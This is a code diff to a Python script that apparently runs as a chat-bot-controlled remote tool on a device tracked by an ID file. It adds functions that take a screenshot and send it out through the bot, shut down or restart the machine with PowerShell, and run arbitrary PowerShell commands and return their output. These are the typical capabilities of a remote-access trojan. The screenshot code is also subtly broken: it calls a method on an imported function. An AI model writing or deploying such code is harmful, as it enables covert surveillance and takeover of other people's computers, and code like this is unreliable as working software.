@@ -10,7 +10,8 @@ import os
 import random
 import subprocess
 import json
-
+from pyautogui import screenshot
+from interactions import File
 #create or read device id
 def create_or_read_id_file():
     id_file_path = "ids.txt"
@@ -65,4 +66,32 @@ def get_ids():
 def read_config():
     with open("config.json", "r") as file:
         return json.load(file)
-
+#make screenshot, send it, delete it
+async def take_sc(ctx):
+    # create sc
+    screenshot_path = 'screenshot.png'
+    screenshot.screenshot(screenshot_path)
+    # send sc
+    await ctx.send(file=File(screenshot_path))
+    # delete sc
+    os.remove(screenshot_path)
+#shutdown and restart
+def shutdown():
+    try:
+        subprocess.run(["powershell", "-Command", "Stop-Computer"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return
+    except subprocess.SubprocessError as e:
+        return f"error: {e}"
+def restart():
+    try:
+        subprocess.run(["powershell", "-Command", "Restart-Computer"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return
+    except subprocess.SubprocessError as e:
+        return f"error: {e}"
+#powershell command
+def powershell(cmd):
+    try:
+        result = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True, check=True)
+        return result.stdout
+    except subprocess.CalledProcessError as e:
+        return f"error: {e}"
